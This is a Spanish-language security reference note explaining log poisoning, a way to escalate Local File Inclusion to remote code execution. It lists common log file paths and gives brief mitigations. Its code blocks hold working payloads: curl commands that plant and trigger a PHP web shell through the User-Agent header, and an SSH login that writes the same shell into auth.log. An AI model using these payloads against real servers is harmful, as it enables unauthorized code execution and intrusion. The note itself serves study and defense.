#reference #Web_Security

**Log Poisoning** = técnica que convierte una **LFI** (Local File Inclusion) en **RCE**. Si controlamos un dato que el servidor escribe en un log (User-Agent, parámetro, usuario SSH…) y luego incluimos ese log vía LFI, el PHP inyectado se ejecuta.

> Requiere dos cosas: (1) poder **escribir contenido controlado en un fichero de log** y (2) una **LFI** que incluya ese fichero. Logs no saneados + inclusión = ejecución de código.

# Flujo

```
1. Inyectar payload PHP en un campo que se loguea (ej. User-Agent)
2. El servidor lo escribe en /var/log/apache2/access.log
3. Incluir ese log con la LFI: ?page=/var/log/apache2/access.log
4. PHP interpreta el payload -> RCE
```

# Payload e inyección

```bash
# Envenenar el access log vía User-Agent
curl http://victima/ -A "<?php system(\$_GET['cmd']); ?>"

# Disparar vía LFI + ejecutar comando
curl "http://victima/index.php?page=/var/log/apache2/access.log&cmd=id"
```

# Vectores de log frecuentes

| Fuente | Fichero típico |
|--------|----------------|
| Apache access | `/var/log/apache2/access.log` |
| Apache error | `/var/log/apache2/error.log` |
| Nginx | `/var/log/nginx/access.log` |
| SSH auth (usuario = payload) | `/var/log/auth.log` |
| Mail | `/var/log/mail.log` |
| Sesiones PHP | `/var/lib/php/sessions/sess_<id>` |
| `/proc/self/environ` | Vía User-Agent (en algunos setups) |

```bash
# Log poisoning por SSH: el usuario inválido queda en auth.log
ssh '<?php system($_GET[cmd]); ?>'@victima
```

# Relación

Es una **escalada de LFI**. Otras vías de LFI→RCE: wrappers `php://filter`/`data://`, sesiones PHP, `/proc/self/environ`, subida de fichero + inclusión.

# Mitigación

No incluir ficheros por entrada de usuario (whitelist), `allow_url_include=Off`, sanear/validar rutas, separar logs de la raíz web, permisos restrictivos.

# Recursos
### [HackTricks — LFI to RCE via logs](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi--rce-using-log-files)
### [Demostración — El Pingüino de Mario](https://www.youtube.com/watch?v=GQlHNjdD1zc)
